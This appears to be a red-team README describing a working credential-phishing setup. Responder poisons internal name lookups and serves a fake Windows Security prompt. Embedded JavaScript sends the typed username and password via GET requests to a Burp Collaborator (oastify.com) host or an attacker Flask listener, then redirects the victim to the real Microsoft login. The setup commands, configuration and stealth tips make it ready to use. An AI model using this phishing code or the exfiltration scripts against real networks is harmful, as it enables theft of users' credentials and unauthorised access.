# 🛠️ Cleartext Windows Credential Phishing + Exfiltration Using Responder (HTTP+HTTPS)

## 🌟 Objective

Create a phishing environment that exfiltrates credentials **stealthily via GET requests** over both HTTP and HTTPS, without triggering browser warnings.

---

## 📩 Components

- **Responder**
  - Poisons LLMNR/NBNS/WPAD to hijack internal hostname lookups
  - Serves the fake login page over HTTP (`port 80`)
- **Fake login page**
  - A crafted HTML page used to mimick a Windows Security Prompt
  - Uses JS to decide whether to exfil over HTTP (`GET`) or HTTPS (`POST`) to ensure mixed content is not loaded and minimise friction in the form of browser warnings/errors
- **HTTP(S) listener**
  - An attacker-controlled listener will wait for incoming exfiltration requests
  - This server ideally has a valid HTTPS certificate to minimise warnings
  - Burp collaborator is recommended
  - In the event it is blocked by the client network, something like FakeWindowsAuthListener.py can be used, this spawns
    - HTTP listener on port `9998`
    - HTTPS listener on port `9999`

❗❗❗ NOTE ❗❗❗
- It is **strongly recommended** to:
  - Use a **valid HTTPS certificate**, e.g.:
    - [Let's Encrypt](https://letsencrypt.org/)
    - [mkcert](https://github.com/FiloSottile/mkcert)
    - Internal trusted CA
  - Or better yet, use a service like **Burp Collaborator** to receive credential beacons
- Flask listener approach is a fallback. Use it **only if** you can not use Burp

---

## 🔧 Setup Instructions

> If using Burp Collaborator or similar, go straight to #3

### 1. Create the Flask Listener

Save as `listener.py`:

- Runs HTTP server on port 9998
- Runs HTTPS server on port 9999
- Logs credentials to `/tmp/responder_creds.txt`

### 2. Generate a Self-Signed SSL Certificate

```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
```

- Use your server’s IP or domain as the **Common Name (CN)**
- Store both `cert.pem` and `key.pem` in the same folder as `listener.py`

> ⚠️ If using this in a real engagement, replace with a **valid certificate** or consider using **Burp Collaborator** to exfil the beacon.

### 3. Update Fake Login Page

Update the JavaScript `exfil()` function code according to the method you are using to capture credentials.

The JavaScript captures credentials and sends via `GET`. This avoids the need for a form `POST`, preventing any warning prompts.

Example: Burp Collaborator
```js
  <script>
    function exfil() {
      const u = encodeURIComponent(document.getElementById("UserNameText").value);
      const p = encodeURIComponent(document.getElementById("PasswordText").value);
      const protocol = window.location.protocol;
      const host = '10zd6vqmp4s3uoveqramsqf01r7ivajz.oastify.com';
      const i = new Image();
      i.src = `${protocol}//${host}/log?u=${u}&p=${p}`;
    
      // Optionally hold the image in DOM - Potential for DNS exfil here
      document.body.appendChild(i);
    
      // Redirect
      setTimeout(() => {
        window.location.href = "https://login.microsoftonline.com";
      }, 1000);
    }
  </script>
```

Example: Flask
```js
  <script>
    function exfil() {
      const u = encodeURIComponent(document.getElementById("UserNameText").value);
      const p = encodeURIComponent(document.getElementById("PasswordText").value);
      const protocol = window.location.protocol;
      const host = window.location.hostname;
      const port = protocol === "https:" ? "9999" : "9998";
      const i = new Image();
      i.src = `${protocol}//${host}:${port}/log?u=${u}&p=${p}`;
    
      // Optionally hold the image in DOM - Potential for DNS exfil here
      document.body.appendChild(i);
    
      // Redirect
      setTimeout(() => {
        window.location.href = "https://login.microsoftonline.com";
      }, 1000);
    }
  </script>
```

### 4. Configure Responder

Edit `Responder.conf`:

```ini
[HTTP]
Serve_Html = On
Html_Filename = /files/FakeWindowsAuth.html
```

Run Responder:

`sudo responder -I <interface> -wdDv`

Responder will:
- Poison hostname lookups (e.g., `intranet`, `portal`)
- Serve the phishing login page

### 5. Run the Flask Listener (If not using Burp Collaborator)

`sudo python3 FakeWindowsAuthListener.py`

---

## 🧐 Attack Flow

| Component        | Role                                                  |
|------------------|-------------------------------------------------------|
| **Responder**    | Hijacks name resolution and serves phishing HTML      |
| **Login Page**   | Uses JS to exfil creds via `GET` based on protocol    |
| **Flask Server** | Logs GET requests from port 9998 (HTTP) and 9999 (HTTPS) |
| **Redirect**     | Sends victim to a real login page after exfiltration  |
